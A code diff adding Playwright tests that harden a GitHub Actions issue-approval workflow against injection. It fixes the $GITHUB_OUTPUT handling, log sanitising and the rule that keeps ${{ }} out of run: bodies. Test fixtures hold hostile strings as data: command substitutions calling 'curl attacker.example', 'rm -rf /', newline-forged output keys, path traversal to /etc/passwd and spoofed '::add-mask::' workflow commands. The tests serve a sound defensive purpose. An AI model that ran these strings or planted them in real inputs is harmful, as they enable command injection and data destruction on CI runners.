@@ -29,7 +29,7 @@ import { expect, test } from '@playwright/test';
  * moment-watch.yml (the wiring is YAML, and a static assertion is the honest
  * form of that guarantee here).
  */
-import { checkMoments, vehicleKind } from '../lib/moments-gate.mjs';
+import { ID_RE, checkMoments, vehicleKind } from '../lib/moments-gate.mjs';
 import { nominationSlug, type Nomination } from '../lib/core/nominations';
 import { buildReport } from '../scripts/moment-candidates.mjs';
 import { draftFor, groundFor } from '../scripts/moment-draft.mjs';
@@ -46,8 +46,11 @@ import {
   parseScaffold,
   prTitle,
   recordDrift,
+  refusalComment,
+  renderOutputs,
   replaceDirective,
   sameCopy,
+  sanitizeForLog,
   slotDecision,
 } from '../scripts/moment-approve.mjs';
 
@@ -206,6 +209,104 @@ test.describe('the issue-body parser', () => {
     expect(parsed.ok).toBe(false);
     if (!parsed.ok) expect(parsed.error).toContain(PLACEHOLDER_ID);
   });
+
+  /*
+   * THE ID IS UNTRUSTED INPUT — the reproduction, kept as a fixture.
+   *
+   * Until 2026-08-12 parseScaffold accepted ANY string as the moment id. The
+   * gate would have rejected it eventually, but only after the id had already
+   * become a $GITHUB_OUTPUT value, an env: value, a branch name and a commit
+   * subject. The first fixture below is the real one: a key carrying a newline
+   * forges a second GITHUB_OUTPUT line, and `reason=` was read straight into a
+   * `run:` body on a runner with contents: write against an unprotected main.
+   */
+  const HOSTILE_IDS: [string, string][] = [
+    ['a newline forging a second GITHUB_OUTPUT key', 'evil\nreason=$(id)'],
+    ['a carriage return doing the same', 'evil\rmoment_id=other'],
+    ['command substitution', 'evil$(curl attacker.example)'],
+    ['a shell metacharacter', 'evil; rm -rf /'],
+    ['a path traversal in what becomes a branch name', '../../../etc/passwd'],
+    ['a leading dash, which git reads as a flag', '--force'],
+    ['uppercase, which the gate rejects but only at the end', 'Evil-Id'],
+    ['a double hyphen', 'a--b'],
+    ['a trailing hyphen', 'trailing-'],
+    ['whitespace', 'two words'],
+  ];
+
+  for (const [label, id] of HOSTILE_IDS) {
+    test(`parseScaffold refuses an id with ${label}`, () => {
+      const parsed = parseScaffold(`\`\`\`json\n${JSON.stringify({ [id]: { name: { en: 'x', es: 'x' } } })}\n\`\`\``);
+      expect(parsed.ok, `"${id.replace(/[\r\n]/g, '\\n')}" must not parse`).toBe(false);
+      if (!parsed.ok) {
+        expect(parsed.error).toContain('lowercase kebab slug');
+        // The refusal must not echo the hostile key back into a log line.
+        expect(parsed.error).not.toContain(id);
+      }
+    });
+  }
+
+  test('the id regex it enforces IS the gate\'s, not a second copy', () => {
+    // §2.3: a second definition is a definition that can disagree, and the day
+    // they do the loose one wins. Same object, imported from the gate.
+    expect(ID_RE.source).toBe(/^[a-z0-9]+(-[a-z0-9]+)*$/.source);
+    const good = parseScaffold('```json\n{"syria-sanctions-repeal":{"name":{"en":"x","es":"x"}}}\n```');
+    expect(good.ok).toBe(true);
+  });
+});
+
+/* ================================================================== *
+ * 1b · $GITHUB_OUTPUT and the log — two line-oriented channels
+ * ================================================================== */
+
+test.describe('the GITHUB_OUTPUT writer', () => {
+  test('writes one key=value line per pair', () => {
+    expect(renderOutputs([['decision', 'approve'], ['moment_id', 'syria-sanctions-repeal']])).toBe(
+      'decision=approve\nmoment_id=syria-sanctions-repeal\n',
+    );
+  });
+
+  test('an empty value is fine — it is how "no retirement" is expressed', () => {
+    expect(renderOutputs([['retire', '']])).toBe('retire=\n');
+  });
+
+  test('THE INJECTION: a value containing a newline is refused, not escaped', () => {
+    // Forging a line here means declaring an output this script never set, and
+    // the workflow consumes those. There is no legitimate multi-line value in
+    // this script, so refusing is strictly better than encoding.
+    expect(() => renderOutputs([['moment_id', 'evil\nreason=$(id)']])).toThrow(/newline or NUL/);
+    expect(() => renderOutputs([['reason', 'a\rb']])).toThrow(/newline or NUL/);
+    expect(() => renderOutputs([['reason', 'a\0b']])).toThrow(/newline or NUL/);
+  });
+
+  test('the refusal does not repeat the hostile value into the log', () => {
+    try {
+      renderOutputs([['moment_id', 'evil\nreason=$(curl attacker.example)']]);
+      throw new Error('should have thrown');
+    } catch (e) {
+      expect((e as Error).message).not.toContain('attacker.example');
+      expect((e as Error).message).toContain('not repeated here');
+    }
+  });
+
+  test('a key that is not a plain identifier is refused too', () => {
+    expect(() => renderOutputs([['not a key', 'x']])).toThrow(/plain identifier/);
+    expect(() => renderOutputs([['UPPER', 'x']])).toThrow(/plain identifier/);
+  });
+});
+
+test.describe('the log guard', () => {
+  test('a workflow command in issue-derived text is neutralised', () => {
+    // A run: step's stderr is scanned by the runner for ::command:: lines, and
+    // several refusal messages quote the issue back.
+    const out = sanitizeForLog('::add-mask::secret\n  ::error::spoofed');
+    expect(out).not.toMatch(/^\s*::/m);
+    expect(out).toContain('add-mask');
+  });
+
+  test('ordinary prose is untouched', () => {
+    const prose = 'the id `a-b` is not live (status: retired) — see docs';
+    expect(sanitizeForLog(prose)).toBe(prose);
+  });
 });
 
 /* ================================================================== *
@@ -346,6 +447,57 @@ test.describe('slot logic', () => {
     const d = slotDecision({ moments: momentsWith(['a']), newId: 'a' });
     expect(d.ok).toBe(false);
     if (!d.ok) expect(d.error).toContain('already a key');
+  });
+
+  test('the id-collision refusal has its OWN heading, not the replace directive\'s', () => {
+    // It used to return need:'valid-directive', so an issue carrying NO
+    // directive was told "the replace directive does not resolve" — a heading
+    // about a comment the owner never wrote.
+    const d = slotDecision({ moments: momentsWith(['a']), newId: 'a' });
+    expect(d.ok).toBe(false);
+    if (d.ok) return;
+    expect(d.need).toBe('id-collision');
+    const comment = refusalComment({ reason: d.need, error: d.error }, { issue: 1 });
+    expect(comment).toContain('that moment id is already taken');
+    expect(comment).not.toContain('replace directive does not resolve');
+  });
+
+  /*
+   * S4 — THE ORDERING BUG, kept as a fixture because the symptom is silent.
+   *
+   * A `/replace` comment is durable: it sits in the thread forever and the
+   * label can be re-applied days later. Consulting it before checking for room
+   * meant a directive written for a six-full attempt still fired on a LATER
+   * approval that needed no slot — retiring a live Big Question to make room
+   * that already existed, with nothing in the PR saying so.
+   */
+  test('a leftover directive does NOT retire anything when there is room', () => {
+    const d = slotDecision({ moments: momentsWith(['a', 'b']), replaceId: 'a', newId: 'new' });
+    expect(d).toMatchObject({ ok: true, action: 'append', retire: null });
+  });
+
+  test('…and the ignored directive is reported rather than swallowed', () => {
+    const d = slotDecision({ moments: momentsWith(['a', 'b']), replaceId: 'a', newId: 'new' });
+    if (!d.ok) throw new Error('expected room');
+    expect(d.ignoredDirective).toBe('a');
+  });
+
+  test('an ignored directive that names nothing real is still only ignored, never an error', () => {
+    // At five live the directive is irrelevant, valid or not — validating it
+    // would refuse an approval that needs no slot at all.
+    const d = slotDecision({ moments: momentsWith(['a']), replaceId: 'nonexistent', newId: 'new' });
+    expect(d).toMatchObject({ ok: true, action: 'append', retire: null, ignoredDirective: 'nonexistent' });
+  });
+
+  test('with no directive and room, ignoredDirective is null rather than undefined', () => {
+    const d = slotDecision({ moments: momentsWith(['a']), newId: 'new' });
+    if (!d.ok) throw new Error('expected room');
+    expect(d.ignoredDirective).toBeNull();
+  });
+
+  test('at the cap the directive is obeyed — it is only ever read there', () => {
+    const d = slotDecision({ moments: momentsWith(SIX), replaceId: 'c', newId: 'new' });
+    expect(d).toMatchObject({ ok: true, action: 'replace', retire: 'c', ignoredDirective: null });
   });
 
   test('a retired id still collides — the entry persists as the record that it existed', () => {
@@ -677,6 +829,44 @@ const withoutComments = (text: string) =>
     .filter((l) => !/^\s*#/.test(l))
     .join('\n');
 
+/**
+ * Every `run: |` block in a workflow, as { step, body }.
+ *
+ * Written by hand rather than with a YAML parser because the repo ships none
+ * as a dependency, and because the property under test is textual anyway: a
+ * `${{ }}` is substituted into the script SOURCE before bash parses it, so
+ * what matters is exactly which characters land inside the block scalar.
+ *
+ * A block scalar's body is every following line indented deeper than the
+ * `run:` key itself, blank lines included.
+ */
+function runBodies(text: string): { step: string; body: string }[] {
+  const lines = text.split('\n');
+  const out: { step: string; body: string }[] = [];
+  let step = '(unnamed)';
+  for (let i = 0; i < lines.length; i++) {
+    const named = /^\s*- name:\s*(.+?)\s*$/.exec(lines[i]);
+    if (named) step = named[1];
+    const run = /^(\s*)run:\s*[|>][-+]?\s*$/.exec(lines[i]);
+    if (!run) continue;
+    const indent = run[1].length;
+    const body: string[] = [];
+    let j = i + 1;
+    for (; j < lines.length; j++) {
+      const line = lines[j];
+      if (line.trim() === '') {
+        body.push(line);
+        continue;
+      }
+      if (line.search(/\S/) <= indent) break;
+      body.push(line);
+    }
+    out.push({ step, body: body.join('\n') });
+    i = j - 1;
+  }
+  return out;
+}
+
 test.describe('moment-approve.yml', () => {
   const yml = () => withoutComments(workflow('moment-approve.yml'));
 
@@ -692,6 +882,33 @@ test.describe('moment-approve.yml', () => {
     expect(gate).toBeGreaterThan(-1);
     expect(checkout).toBeGreaterThan(-1);
     expect(gate).toBeLessThan(checkout);
+  });
+
+  test('the owner check is its OWN job, and that job holds no write scope worth stealing', () => {
+    // A step that decides whether an untrusted trigger may proceed should not
+    // itself be holding the capability it is deciding about. `authorize` can
+    // comment and unlabel; it cannot write a branch. `publish` declares the
+    // write scopes and cannot start until `authorize` passes.
+    const text = yml();
+    const authorize = text.slice(text.indexOf('  authorize:'), text.indexOf('  publish:'));
+    expect(authorize).toContain('issues: write');
+    expect(authorize).not.toContain('contents: write');
+    expect(authorize).not.toContain('pull-requests: write');
+    expect(authorize).not.toContain('actions: write');
+    expect(authorize).not.toContain('actions/checkout');
+    expect(text).toMatch(/publish:\n\s+needs: authorize/);
+    // …and no workflow-level grant that would hand the write scopes to both.
+    expect(text).not.toMatch(/^permissions:/m);
+  });
+
+  test('runs serialise on the FILE they contend for, not on the issue that triggered them', () => {
+    // Keyed per issue, two different candidates labelled a minute apart each
+    // read a 5-live data/moments.json and each concluded it had room — the
+    // 6-cap checked twice, concurrently, against the same stale snapshot.
+    const text = yml();
+    expect(text).toMatch(/group: moment-approve\s*$/m);
+    expect(text).not.toMatch(/group: moment-approve-\$\{\{/);
+    expect(text).toMatch(/cancel-in-progress: false/);
   });
 
   test('it checks BOTH the labeler and the actor against the owner, and fails the run', () => {
@@ -717,6 +934,50 @@ test.describe('moment-approve.yml', () => {
     expect(text).toMatch(/--json body --jq \.body > \/tmp\/approve\/body\.md/);
   });
 
+  /*
+   * THE PIN ABOVE PASSED WITH THE HOLE OPEN, which is why this one exists.
+   *
+   * It enumerated three `github.event.*` paths — the obvious carriers of issue
+   * text — and said nothing about `steps.*.outputs.*`. But a step output is
+   * issue text one hop later: `moment_id` and `reason` are computed FROM the
+   * issue body, and `echo "::notice::refused (${{ steps.decide.outputs.reason
+   * }})"` shipped for three days on a job holding `contents: write` against an
+   * unprotected `main`. A crafted issue key could forge a second
+   * $GITHUB_OUTPUT line and land its own text inside that shell command.
+   *
+   * A denylist of known-bad paths can only ever be one context behind, so this
+   * bans the SHAPE: no `${{ … }}` of any kind inside a `run:` body, ever.
+   * `${{ … }}` is textual substitution performed before bash sees the line, so
+   * there is no such thing as a safely-quoted one. Every value a script needs
+   * goes through `env:`, where it is a variable rather than source code.
+   */
+  test('NO ${{ }} expression of any kind appears inside a run: body', () => {
+    const offenders: string[] = [];
+    for (const wf of ['moment-approve.yml', 'moment-watch.yml']) {
+      for (const { step, body } of runBodies(workflow(wf))) {
+        for (const line of body.split('\n')) {
+          if (/\$\{\{/.test(line) && !/^\s*#/.test(line)) {
+            offenders.push(`${wf} · ${step}: ${line.trim()}`);
+          }
+        }
+      }
+    }
+    expect(
+      offenders,
+      'a ${{ }} expression inside a run: body is textual substitution into source, not a variable — move it into env: and reference $VAR',
+    ).toEqual([]);
+  });
+
+  test('the outputs a run: body DOES read are all bound through env:', () => {
+    // The counterpart to the ban above: the values are still used, just
+    // through the safe channel. If this ever finds none, the ban above has
+    // become vacuous and is passing for the wrong reason.
+    const text = yml();
+    expect(text).toMatch(/REASON: \$\{\{ steps\.decide\.outputs\.reason \}\}/);
+    expect(text).toMatch(/BRANCH: \$\{\{ steps\.decide\.outputs\.branch \}\}/);
+    expect(text).toMatch(/\$\{REASON\}/);
+  });
+
   test('the label is removed on every refusal path, so re-applying it is the retry', () => {
     const text = yml();
     const removals = text.match(/--remove-label "\$LABEL"/g) ?? [];
@@ -734,10 +995,21 @@ test.describe('moment-approve.yml', () => {
     expect(yml()).toMatch(/gh workflow run ci\.yml/);
   });
 
-  test('auto-merge is squash, and a failure to enable it is not a failed run', () => {
+  test('auto-merge is ATTEMPTED, and its failure is a supported outcome rather than a red run', () => {
+    // Verified against the API 2026-08-12: allow_auto_merge is false, main is
+    // unprotected, no rulesets, no required checks — so this command fails on
+    // every generated PR today and the else-branch is the LIVE path. The step
+    // name and the issue comment both have to say so; a workflow that
+    // announces "merges itself" over a command that cannot succeed is the
+    // failure mode this project calls a shipped claim that is not true.
     const text = yml();
     expect(text).toMatch(/gh pr merge .*--auto --squash/);
     expect(text).toMatch(/if gh pr merge/);
+    expect(text).toMatch(/- name: Attempt auto-merge on green/);
+    expect(text).toContain('Allow auto-merge');
+    expect(text).toContain('required status check');
+    // the not-available comment must tell him the PR is waiting for HIM
+    expect(text).toMatch(/waiting for you/);
   });
 
   test('it commits as oravan-sync — a bot author silently breaks the Vercel deploy', () => {
